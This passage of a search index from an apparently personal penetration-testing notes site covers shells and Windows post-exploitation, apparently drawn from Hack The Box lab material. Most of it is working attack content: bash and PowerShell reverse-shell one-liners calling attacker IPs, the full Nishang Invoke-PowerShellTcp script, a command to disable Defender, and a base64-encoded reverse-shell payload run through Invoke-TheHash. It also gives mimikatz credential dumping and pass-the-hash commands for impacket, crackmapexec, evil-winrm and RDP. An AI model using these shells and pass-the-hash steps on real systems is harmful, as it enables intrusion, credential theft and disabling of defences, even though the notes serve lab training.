WebLogic)</li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#send_1","title":"SEND:","text":"<ul> <li><code>curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.60/443 0&gt;&amp;1\"'</code></li> <li><code>bash -c 'sh -i &gt;%26 /dev/tcp/10.10.14.5/9999 0&gt;%261'</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#upload-reverse-shell-file","title":"UPLOAD REVERSE SHELL FILE","text":"<ul> <li><code>curl 10.10.14.8:9998/Exploit/bash.sh -o /tmp/bash.sh</code></li> <li><code>./tmp/bash.sh</code></li> <li><code>bash /tmp/bash.sh</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#listening-shell","title":"LISTENING SHELL:","text":"<ul> <li><code>nc -lnvp 9999</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#antak-webshell-httpsgithubcomsamratashoknishangtreemasterantak-webshell","title":"Antak Webshell (https://github.com/samratashok/nishang/tree/master/Antak-WebShell)","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#upgrade-shell","title":"UPGRADE SHELL:","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#stabilize","title":"STABILIZE:","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#binsh-i","title":"/bin/sh -i","text":"<p>-<code>/bin/sh -i</code></p>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#perl","title":"Perl","text":"<p>-<code>perl \u2014e 'exec \"/bin/sh\";'</code> - <code>perl: exec \"/bin/sh\";</code></p>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#ruby","title":"Ruby","text":"<ul> <li><code>ruby: exec \"/bin/sh\"</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#lua","title":"Lua","text":"<ul> <li><code>lua: os.execute('/bin/sh')</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#awk","title":"AWK","text":"<ul> <li><code>awk 'BEGIN {system(\"/bin/sh\")}'</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#find","title":"Find","text":"<ul> <li><code>find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#using-exec-to-launch-a-shell","title":"Using Exec To Launch A Shell","text":"<ul> <li><code>find . -exec /bin/sh \\; -quit</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#vim","title":"VIM","text":"<ul> <li><code>vim -c ':!/bin/sh'</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#vim-escape","title":"Vim Escape","text":"<pre><code>vim\n:set shell=/bin/sh\n:shell\n</code></pre> <pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\"CTRL+Z\"\nstty raw -echo; fg\nexport TERM=xterm\n</code></pre>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#proper-shell","title":"PROPER SHELL:","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#victim","title":"Victim","text":"<pre><code>ssh-keygen\ncd ./ssh\ncat id_rsa.pub &gt; authorized_keys\nchmod 700 ~/\nchmod 700 ~/.ssh\nchmod 600 ~/.ssh/authorized_key\n</code></pre>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#host","title":"Host","text":"<ul> <li><code>nano id_rsa</code></li> <li>(Copy from id_rsa victim)</li> <li><code>chmod 400 id_rsa</code></li> <li><code>ssh -i id_rsa matt@10.10.11.136</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#passphrase","title":"PASSPHRASE:","text":"<pre><code>python3 /usr/share/john/ssh2john.py id_rsa &gt; hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n</code></pre> <p><code>john --show hash.txt</code></p>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#bind-shells","title":"Bind Shells","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#server-target-starting-netcat-listener","title":"Server - Target starting Netcat listener","text":"<ul> <li><code>nc -lvnp 7777</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#client-attack-box-connecting-to-target","title":"Client - Attack box connecting to target","text":"<ul> <li><code>nc -nv 10.129.41.200 7777</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#establishing-a-basic-bind-shell-with-netcat","title":"Establishing a Basic Bind Shell with Netcat","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#server-binding-a-bash-shell-to-the-tcp-session","title":"Server - Binding a Bash shell to the TCP session","text":"<ul> <li><code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 10.129.41.200 7777 &gt; /tmp/f</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#client-connecting-to-bind-shell-on-target","title":"Client - Connecting to bind shell on target","text":"<ul> <li><code>nc -nv 10.129.41.200 7777</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#reverse-shells","title":"Reverse Shells","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#server-attack-box","title":"Server - attack box","text":"<ul> <li><code>sudo nc -lvnp 443</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#client-target-windows","title":"Client - target (WINDOWS)","text":"<ul> <li><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.15.60',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#disable-av","title":"Disable AV","text":"<ul> <li><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></li> </ul> <pre><code>function Invoke-PowerShellTcp \n{ \n&lt;#\n.SYNOPSIS\nNishang script which can be used for Reverse or Bind interactive PowerShell from a target. \n.DESCRIPTION\nThis script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. \nAlso, a standard Netcat can connect to this script Bind to a specific port.\nThe script is derived from Powerfun written by Ben Turner &amp; Dave Hardy\n.PARAMETER IPAddress\nThe IP address to connect to when using the -Reverse switch.\n.PARAMETER Port\nThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.\n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444\nAbove shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on \nthe given IP and port. \n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Bind -Port 4444\nAbove shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. \n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444\nAbove shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be\nlistening on the given IP and port. \n.LINK\nhttp://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html\nhttps://github.com/nettitude/powershell/blob/master/powerfun.ps1\nhttps://github.com/samratashok/nishang\n#&gt;      \n    [CmdletBinding(DefaultParameterSetName=\"reverse\")] Param(\n\n        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=\"bind\")]\n        [String]\n        $IPAddress,\n\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"bind\")]\n        [Int]\n        $Port,\n\n        [Parameter(ParameterSetName=\"reverse\")]\n        [Switch]\n        $Reverse,\n\n        [Parameter(ParameterSetName=\"bind\")]\n        [Switch]\n        $Bind\n\n    )\n\n\n    try \n    {\n        #Connect back if the reverse switch is used.\n        if ($Reverse)\n        {\n            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)\n        }\n\n        #Bind to the provided port if Bind switch is used.\n        if ($Bind)\n        {\n            $listener = [System.Net.Sockets.TcpListener]$Port\n            $listener.start()    \n            $client = $listener.AcceptTcpClient()\n        } \n\n        $stream = $client.GetStream()\n        [byte[]]$bytes = 0..65535|%{0}\n\n        #Send back current username and computername\n        $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + $env:username + \" on \" + $env:computername + \"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\")\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        #Show an interactive PowerShell prompt\n        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n        {\n            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding\n            $data = $EncodedText.GetString($bytes,0, $i)\n            try\n            {\n                #Execute the command on the target.\n                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )\n            }\n            catch\n            {\n                Write-Warning \"Something went wrong with execution of command on the target.\" \n                Write-Error $_\n            }\n            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '\n            $x = ($error[0] | Out-String)\n            $error.clear()\n            $sendback2 = $sendback2 + $x\n\n            #Return the results\n            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n            $stream.Write($sendbyte,0,$sendbyte.Length)\n            $stream.Flush()  \n        }\n        $client.Close()\n        if ($listener)\n        {\n            $listener.Stop()\n        }\n    }\n    catch\n    {\n        Write-Warning \"Something went wrong! Check if the server is reachable and you are using the correct port.\" \n        Write-Error $_\n    }\n}\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/CommonServices/Windows/","title":"Server Message Block (SMB)","text":""},{"location":"old/Phases/4-PostExploitation/CommonServices/Windows/#windows","title":"Windows","text":""},{"location":"old/Phases/4-PostExploitation/CommonServices/Windows/#windows-cmd-dir","title":"Windows CMD - DIR","text":"<ul> <li><code>dir \\\\192.168.220.129\\Finance\\</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CommonServices/Windows/#windows-cmd-net-use","title":"Windows CMD - Net Use","text":"<ul> <li><code>net use n: \\\\192.168.220.129\\Finance</code></li> </ul> <p>The command net use connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter n.</p> <ul> <li><code>net use n: \\\\192.168.220.129\\Finance /user:plaintext Password123</code> We can also provide a username and password to authenticate to the share.</li> </ul>"},{"location":"old/Phases/4-PostExploitation/CommonServices/Windows/#windows-cmd-dir_1","title":"Windows CMD - DIR","text":"<ul> <li> <p><code>dir n: /a-d /s /b | find /c \":\\\"</code></p> </li> <li> <p><code>dir n:\\*cred* /s /b</code></p> </li> <li><code>dir n:\\*secret* /s /b</code></li> <li><code>findstr /s /i cred n:\\*.*</code></li> </ul> <p>If we want to search for a specific word within a text file, we can use findstr.</p> <pre><code>cred\npassword\nusers\nsecrets\nkey\nCommon File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html\n</code></pre> <p>Let's replicate the same commands now using Powershell.</p>"},{"location":"old/Phases/4-PostExploitation/CommonServices/Windows/#windows-powershell","title":"Windows PowerShell","text":"<ul> <li> <p><code>Get-ChildItem \\\\192.168.220.129\\Finance\\</code></p> </li> <li> <p><code>New-PSDrive -Name \"N\" -Root \"\\\\192.168.220.129\\Finance\" -PSProvider \"FileSystem\"</code></p> </li> </ul> <pre><code>PS C:\\htb&gt; $username = 'plaintext'\nPS C:\\htb&gt; $password = 'Password123'\nPS C:\\htb&gt; $secpassword = ConvertTo-SecureString $password -AsPlainText -Force\nPS C:\\htb&gt; $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword\nPS C:\\htb&gt; New-PSDrive -Name \"N\" -Root \"\\\\192.168.220.129\\Finance\" -PSProvider \"FileSystem\" -Credential $cred\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/CommonServices/Windows/#windows-powershell-gci","title":"Windows PowerShell - GCI","text":"<pre><code>N:\n(Get-ChildItem -File -Recurse | Measure-Object).Count\n</code></pre> <ul> <li> <p><code>Get-ChildItem -Recurse -Path N:\\ -Include *cred* -File</code></p> </li> <li> <p><code>Get-ChildItem -Recurse -Path N:\\ | Select-String \"cred\" -List</code></p> </li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/","title":"Pass the Hash (PtH)","text":"<p>A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.</p> <p>As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:</p> <pre><code>Dumping the local SAM database from a compromised host.\nExtracting hashes from the NTDS database (ntds.dit) on a Domain Controller.\nPulling the hashes from memory (lsass.exe).\n</code></pre> <p>Let's assume we obtain the password hash (64F12CDDAA88057E06A81B54E73B949B) for the account julio from the domain inlanefreight.htb. Let's see how we can perform Pass the Hash attacks from Windows and Linux machines.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#windows-ntlm-introduction","title":"Windows NTLM Introduction","text":"<p>Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.</p> <p>Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.</p> <p>With NTLM, passwords stored on the server and domain controller are not \"salted,\" which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a Pass the Hash (PtH) Attack.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-mimikatz-windows","title":"Pass the Hash with Mimikatz (Windows)","text":"<p>The first tool we will use to perform a Pass the Hash attack is Mimikatz. Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:</p> <pre><code>/user - The user name we want to impersonate.\n/rc4 or /NTLM - NTLM hash of the user's password.\n/domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).\n/run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-from-windows-using-mimikatz","title":"Pass the Hash from Windows Using Mimikatz:","text":"<ul> <li> <p><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" &gt;&gt; c:\\tmp\\mimikatz_output.txt</code> </p> </li> <li> <p><code>mimikatz.exe privilege::debug \"sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe\" exit</code></p> </li> </ul> <p>Now we can use cmd.exe to execute commands in the user's context. For this example, julio can connect to a shared folder named julio on the DC.</p> <ul> <li><code>dir \\\\dc01\\julio</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-powershell-invoke-thehash-windows","title":"Pass the Hash with PowerShell Invoke-TheHash (Windows)","text":"<p>Another tool we can use to perform Pass the Hash attacks on Windows is Invoke-TheHash. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user julio and the hash 64F12CDDAA88057E06A81B54E73B949B.</p> <p>When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:</p> <pre><code>Target - Hostname or IP address of the target.\nUsername - Username to use for authentication.\nDomain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.\nHash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.\nCommand - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.\n</code></pre> <p>The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#invoke-thehash-with-smb","title":"Invoke-TheHash with SMB","text":"<pre><code>Import-Module .\\Invoke-TheHash.psd1\nInvoke-SMBExec -Target 10.129.186.240 -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command \"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add\" -Verbose\n</code></pre> <p>We can also get a reverse shell connection in the target machine. If you are unfamiliar with reverse shells, review the Shells &amp; Payloads module on HTB Academy.</p> <p>To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#netcat-listener","title":"Netcat Listener","text":"<ul> <li><code>.\\nc.exe -lvnp 8001</code></li> </ul> <p>To create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8080, and select the option PowerShell #3 (Base64), as shown in the following image.</p> <p>Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).</p> <pre><code>Import-Module .\\Invoke-TheHash.psd1\nInvoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command \"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADgAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=\"\n</code></pre> <p>The result is a reverse shell connection from the DC01 host (172.16.1.10).</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-impacket-linux","title":"Pass the Hash with Impacket (Linux)","text":"<p>Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-impacket-psexec","title":"Pass the Hash with Impacket PsExec","text":"<ul> <li><code>impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</code></li> </ul> <p>There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:     impacket-wmiexec     impacket-atexec     impacket-smbexec</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-crackmapexec-linux","title":"Pass the Hash with CrackMapExec (Linux)","text":"<p>CrackMapExec is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called \"Password Spraying\" and is covered in-depth in the Active Directory Enumeration &amp; Attacks module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.</p> <ul> <li><code>crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453</code></li> </ul> <p>If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#crackmapexec-command-execution","title":"CrackMapExec - Command Execution","text":"<ul> <li><code>crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-evil-winrm-linux","title":"Pass the Hash with evil-winrm (Linux)","text":"<p>evil-winrm is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-evil-winrm","title":"Pass the Hash with evil-winrm","text":"<ul> <li><code>evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-rdp-linux","title":"Pass the Hash with RDP (Linux)","text":"<p>We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.</p> <p>There are a few caveats to this attack:</p> <pre><code>Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:\n</code></pre> <p>This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa with the value of 0. It can be done using the following command:</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#enable-restricted-admin-mode-to-allow-pth","title":"Enable Restricted Admin Mode to Allow PtH","text":"<ul> <li><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></li> </ul> <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#pass-the-hash-using-rdp","title":"Pass the Hash Using RDP","text":"<ul> <li><code>xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/#uac-limits-pass-the-hash-for-local-accounts","title":"UAC Limits Pass the Hash for Local Accounts","text":"<p>UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, \"Administrator\") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.</p> <p>Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.</p> <p>These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/","title":"Pass the Ticket (PtT) from Linux","text":""},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#kerberos-on-linux","title":"Kerberos on Linux","text":""},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#identifying-linux-and-active-directory-integration","title":"Identifying Linux and Active Directory Integration","text":""},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#realm-check-if-linux-machine-is-domain-joined","title":"realm - Check If Linux Machine is Domain Joined","text":"<ul> <li><code>realm list</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#ps-check-if-linux-machine-is-domain-joined","title":"PS - Check if Linux Machine is Domain Joined","text":"<ul> <li><code>ps -ef | grep -i \"winbind\\|sssd\"</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#finding-kerberos-tickets-in-linux","title":"Finding Kerberos Tickets in Linux","text":"<p>As an attacker, we are always looking for credentials. On Linux domain joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let's explore some common ways to find Kerberos tickets.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#finding-keytab-files","title":"Finding Keytab Files","text":"<p>A straightforward approach is to use find to search for files whose name contains the word keytab. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to .keytab. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#using-find-to-search-for-files-with-keytab-in-the-name","title":"Using Find to Search for Files with Keytab in the Name","text":"<ul> <li><code>find / -name *keytab* -ls 2&gt;/dev/null</code></li> </ul> <p><code>Note: To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#identifying-keytab-files-in-cronjobs","title":"Identifying Keytab Files in Cronjobs","text":"<ul> <li><code>crontab -l</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#finding-ccache-files","title":"Finding ccache Files","text":"<p>A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. Let's look for the environment variables and identify the location of our Kerberos credentials cache:</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#reviewing-environment-variables-for-ccache-files","title":"Reviewing Environment Variables for ccache Files.","text":"<ul> <li><code>env | grep -i krb5</code></li> </ul> <p>As mentioned previously, ccache files are located, by default, at /tmp. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still 